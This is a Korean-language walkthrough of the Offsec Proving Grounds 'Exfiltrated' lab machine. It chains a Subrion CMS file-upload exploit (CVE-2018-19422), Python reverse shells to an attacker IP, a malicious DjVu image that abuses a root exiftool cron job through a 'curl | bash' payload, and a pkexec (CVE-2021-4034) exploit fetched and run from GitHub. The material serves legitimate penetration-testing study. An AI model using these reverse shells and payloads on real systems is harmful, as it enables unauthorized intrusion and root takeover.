---

title: "Proving grounds Practice: Exfilterd 문제풀이"

excerpt: "Offsec proving grounds practice linux machine writeup"

categories: pg_practice

tags:

- CTF

- Offsec labs

- OSCP

- Writeup

- Linux

- pg-practice

typora-root-url: ../../

date: 2025-08-26

last_modified_at: 2025-08-26

---

  

## RustScan + Nmap

  

```bash
┌──(kali㉿kali)-[~/Desktop/offsec/exfilterated]
└─$ rustscan -a 192.168.186.163 --ulimit 15000 --timeout 1500                             
[ . . . ]
Open 192.168.186.163:22
Open 192.168.186.163:80

---
┌──(kali㉿kali)-[~/Desktop/offsec/exfilterated]
└─$ nmap -p 22,80 -sV -sC -Pn -n 192.168.186.163 -oA tcpDetailed --min-rate 2000 --open
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 13:54 KST
Nmap scan report for 192.168.186.163
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

IP 주소와 도메인을 맵핑 하기 위해 `/etc/hosts` 파일 수정

```bash
─$ sudo vim /etc/hosts 

# 아이피와 도메인 추가
192.168.186.163 exfiltrated.offsec
```
  

## Web
### PORT: 80
![main_page](/images/2025-08-25-exfiltered/image-1.png)


`admin:admin`으로 관라자 로그인 가능
![admin_page](/images/2025-08-25-exfiltered/image-2.png)

Subrion 4.2 version 사용중
```bash
──(kali㉿kali)-[~/Desktop/offsec]                                                                                                                            
└─$ curl -s http://exfiltrated.offsec/panel/                                                                                                                  
<!DOCTYPE html>                                                                                                                                               
<html lang="en" dir="ltr">                                                                                                                                    
    <head>                                                                                                                                                    
        <meta charset="utf-8">                                                                                                                                
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">                                                                                                 
        <title>Login :: Powered by Subrion 4.2</title>                                                                                                        
        <meta name="viewport" content="width=device-width, initial-scale=1">                                                                                  
        <meta name="generator" content="Subrion CMS - Open Source Content Management System">                                                                 
        <meta name="robots" content="noindex">                                                                                                                
        <base href="http://exfiltrated.offsec/panel/">    
```


## Vulnerability Analysis
```bash
└─$ searchsploit -m 49876                                                                                                                                     
  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                                          
      URL: https://www.exploit-db.com/exploits/49876                                                                                                          
     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py                                                                                                 
    Codes: CVE-2018-19422                                                                                                                                     
 Verified: False                                                                                                                                              
File Type: Python script, ASCII text executable, with very long lines (956)                                                                                   
Copied to: /home/kali/Desktop/offsec/exfilterated/49876.py  
```



## Exploitation

exploit + 초기 침투 성공 (`www-data` 유저 쉘 획득)
```zsh
┌──(kali㉿kali)-[~/Desktop/offsec/exfilterated]
└─$ python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: kbU2Nxy07VglZQl0hgv3n9tBDfDNxDxpFS4RFT2E
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: wiwjxqkvpseztfn

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/wiwjxqkvpseztfn.phar 

$ id; hostname; ip a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
exfiltrated
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:8a:5f brd ff:ff:ff:ff:ff:ff
    inet 192.168.186.163/24 brd 192.168.186.255 scope global ens160
       valid_lft forever preferred_lft forever
```

**위의 획득한 쉘은 불안정한 쉘이기 때문에 리버스 쉘 획득하기**
```zsh
# 업로드한 웹쉘에서 리버스쉘 실행
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.198",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

# my kali 에서 nc 실행
┌──(kali㉿kali)-[~/Desktop/offsec]
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.186.163] 46222
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 리버스 쉘 업그레이드 (Fully TTY Shell)
python3 -c 'import pty; pty.spawn("/bin/bash")' 
ctrl+z 
stty raw -echo; fg 
reset 
export SHELL=bash
export TERM=xterm-256color
```


## Privilege Escalation

자동화 정보 수집 툴 - linpeas
```bash
# 칼리에서 linpeas 다운로드 
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# 칼리에서 웹서버 실행 
python3 -m http.server 80

# 대상 호스트에서 칼리의 linpeas 다운로드 후 바로 실행
cd /dev/shm
wget http://[mykailIP]/linpeas.sh
sh linpeas.sh | tee linpeas.output

---
# linpeas.output
- Vulnerable to CVE-2021-3560
- * *     * * *   root    bash /opt/image-exif.sh
```
- `pkexec 0.105 version` - `CVE-2021-4034`
![pkexec_version_0.105](/images/2025-08-25-exfiltered/image-3.png)


### 권한 상승 - 첫번째 방법 

`root` 권한으로 실행되고 있는 크론 스크립트 존재

```bash
# /opt/image-exif.sh 파일 내용

www-data@exfiltrated:/dev/shm$ cat /opt/image-exif.sh 
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```
IMAGES 변수의 경로의 파일을 리스트 업한 뒤(ls), 그중 jpg 파일을 /usr/bin/exiftool 명령어로 읽은 뒤, LOGFILE 변수의 경로인 `(/opt/metadata/$FILE)`에 openssl로 암호화된 이름으로 담는 스크립트

스크립트 실행
```bash
www-data@exfiltrated:/dev/shm$ sh /opt/image-exif.sh 
-ne 
 metadata directory cleaned! 


-ne 
 Processing EXIF metadata now... 


-ne 
 Processing is finished!
```

참고 - ExifTool은 이미지, 오디오, 비디오, PDF 파일 등의 메타데이터(metadata)를 읽고, 수정하고, 조작할 수 있는 무료 오픈 소스 소프트웨어 도구

#### EXIF exploit
```bash
# djvumake: 제공된 인수에 따라 청크를 복사하거나 생성하여 단일 페이지 DjVu 파일 djvufile을 어셈블하는 프로그램

# djvumake 다운로드
└─$ sudo apt-get install -y djvulibre-bin  
[ . . . ]

└─$ djvumake 
DJVUMAKE --- DjVuLibre-3.5.28
Utility for manually assembling DjVu files

Usage: djvumake djvufile ...arguments...
[ . . . ]
```

djvumake로 사용할 리버스 쉘 파일(shell.sh)과 bash 명령어로 바로 해당 파일(shell.sh)을 실행하도록 하는 파일 생성 (metadata 내 시스템 명령어 삽입)

```bash
└─$ cat shell.sh   
#!/bin/bash

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.198",9998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

---

└─$ cat exploit 
(metadata "\c${system ('curl http://192.168.45.198/shell.sh | bash')};")
```

dejavu 실행
```bash
└─$ djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit

└─$ ls -al exploit.djvu                      
-rw-rw-r-- 1 kali kali 123 Aug 26 16:33 exploit.djvu

└─$ mv exploit.djvu exploit.jpg

└─$ file exploit.jpg            
exploit.jpg: DjVu image or single page document
```

이제 해당 파일을 `/var/www/html/subrion/uploads/` 하위에 옮겨 두고 리스너를 기동

(exploit을 공격 서버에서 호출하기 때문에 http 서버는 계속 열어둬야 한다)

```bash
$ cd /var/www/html/subrion/uploads/
$ wget http://192.168.45.198/exploit.jpg             
--2025-08-26 07:37:12--  http://192.168.45.198/exploit.jpg
[ . . . ]

exploit.jpg         100%[===================>]     123  --.-KB/s    in 0s      

2025-08-26 07:37:12 (35.0 MB/s) - ‘exploit.jpg’ saved [123/123]

www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l
-rw-r--r--  1 www-data www-data  123 Aug 26 07:32 exploit.jpg

---
# 루트 쉘 획득 성공
└─$ nc -lnvp 9998
listening on [any] 9998 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.186.163] 45250
$ id; 
uid=0(root) gid=0(root) groups=0(root)
```

### 권한 상승 - 두번째 방법
- pkexec 0.105 취약점 - `CVE-2021-4034`
 
[익스플로잇 출처]https://github.com/dzonerzy/poc-cve-2021-4034

```bash
# 리버스쉘에서 실행
sh -c "$(curl -sSL https://github.com/dzonerzy/poc-cve-2021-4034/releases/download/v0.2/run-exploit.sh)"
[ . . . ]
Saving to: ‘/tmp/exploit’

/tmp/exploit        100%[===================>]   4.24M  17.2MB/s    in 0.2s    

# 익스플로잇 실행 -> 루트 권한 획득
www-data@exfiltrated:/tmp$ ./exploit 
2025/08/26 07:54:50 CMDTOEXECUTE is empty fallback to default value            
2025/08/26 07:54:50 Executing command sh                                       
# id                                   
uid=0(root) gid=0(root) groups=0(root),33(www-data)    
```